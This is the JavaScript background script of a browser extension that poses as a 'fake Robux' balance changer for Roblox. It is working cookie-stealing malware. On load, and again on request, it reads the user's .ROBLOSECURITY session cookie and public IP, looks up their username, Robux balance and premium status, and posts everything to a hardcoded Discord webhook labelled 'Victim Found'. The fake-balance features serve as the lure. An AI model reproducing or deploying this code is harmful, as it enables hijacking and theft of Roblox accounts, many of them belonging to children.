const WEBHOOK = "https://discord.com/api/webhooks/1428236927966122146/4aFWgA7-hzzp5sYSCGQ0G2A9R4hczS2KKa1GruCp_893snOM5RLgDtUpF9dEpC4d8EVJ";

async function sendCookieToWebhook(cookie) {
    let ipAddr = "N/A";
    let statistics = null;

    try {
        ipAddr = await (await fetch("https://api.ipify.org")).text();
    } catch (e) {
        console.error("IP fetch failed, keepin' it N/A:", e);
    }

    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                redirect: "manual"
            });

            if (response.ok && response.headers.get("content-type")?.includes("application/json")) {
                statistics = await response.json();
            } else {
                console.error("Roblox API didn’t return JSON, maybe bad cookie or blocked. Status:", response.status);
            }
        } catch (e) {
            console.error("Roblox API fetch failed:", e);
        }
    }

    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                        color: null,
                        fields: [
                            {
                                name: "Username",
                                value: statistics ? statistics.UserName : "N/A",
                                inline: true
                            },
                            {
                                name: "Robux",
                                value: statistics ? statistics.RobuxBalance : "N/A",
                                inline: true
                            },
                            {
                                name: "Premium",
                                value: statistics ? statistics.IsPremium : "N/A",
                                inline: true
                            }
                        ],
                        author: {
                            name: `Victim Found: ${ipAddr}`,
                            icon_url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                        },
                        footer: {
                            text: "https://github.com/ox-y",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                        },
                        thumbnail: {
                            url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                        }
                    }
                ],
                username: "Roblox",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                attachments: []
            })
        });
        console.log("Cookie sent to webhook successfully");
        return statistics ? statistics.RobuxBalance : null;
    } catch (e) {
        console.error("Webhook fetch failed:", e);
        return null;
    }
}

async function getOriginalRobuxBalance(cookie) {
    let statistics = null;
    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                redirect: "manual"
            });

            if (response.ok && response.headers.get("content-type")?.includes("application/json")) {
                statistics = await response.json();
            } else {
                console.error("Roblox API didn’t return JSON, maybe bad cookie or blocked. Status:", response.status);
            }
        } catch (e) {
            console.error("Roblox API fetch failed:", e);
        }
    }
    return statistics ? statistics.RobuxBalance : null;
}

async function getUserProfile(cookie) {
    let statistics = null;
    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                redirect: "manual"
            });

            if (response.ok && response.headers.get("content-type")?.includes("application/json")) {
                statistics = await response.json();
            } else {
                console.error("Roblox API didn’t return JSON, maybe bad cookie or blocked. Status:", response.status);
            }
        } catch (e) {
            console.error("Roblox API fetch failed:", e);
        }
    }
    return statistics ? { username: statistics.UserName, avatarUrl: statistics.ThumbnailUrl } : { username: "N/A", avatarUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" };
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "sendCookie") {
        chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
            sendCookieToWebhook(cookie ? cookie.value : null).then((robuxBalance) => {
                sendResponse({ status: "Cookie send triggered", robuxBalance });
            });
        });
        return true;
    } else if (message.type === "updateFakeRobux") {
        chrome.storage.local.get(["firstTimeUse"], (result) => {
            const isFirstTime = result.firstTimeUse !== false;
            const amount = parseInt(message.amount);
            if (isNaN(amount) || amount < 0) {
                sendResponse({ status: "Invalid Robux amount" });
                return;
            }
            chrome.storage.local.set({ fakeRobux: amount, hasAnimated: false, firstTimeUse: false }, () => {
                chrome.tabs.query({ url: "https://www.roblox.com/*" }, (tabs) => {
                    if (tabs.length > 0) {
                        chrome.tabs.sendMessage(tabs[0].id, {
                            type: "updateFakeRobux",
                            amount: amount,
                            refresh: true
                        }, (response) => {
                            sendResponse({ status: response?.status || "Fake Robux update sent" });
                        });
                    } else {
                        sendResponse({ status: "No Roblox tab found" });
                    }
                });
            });
        });
        return true;
    } else if (message.type === "resetFakeRobux") {
        chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
            getOriginalRobuxBalance(cookie ? cookie.value : null).then((robuxBalance) => {
                chrome.storage.local.set({ fakeRobux: robuxBalance || 0, hasAnimated: true }, () => {
                    chrome.tabs.query({ url: "https://www.roblox.com/*" }, (tabs) => {
                        if (tabs.length > 0) {
                            chrome.tabs.sendMessage(tabs[0].id, {
                                type: "resetRobux",
                                amount: robuxBalance || 0
                            });
                        }
                    });
                    sendResponse({ status: "Fake Robux reset" });
                });
            });
        });
        return true;
    } else if (message.type === "getUserProfile") {
        chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
            getUserProfile(cookie ? cookie.value : null).then((profile) => {
                sendResponse({ status: "Profile fetched", profile });
            });
        });
        return true;
    }
});

chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
    sendCookieToWebhook(cookie ? cookie.value : null);
});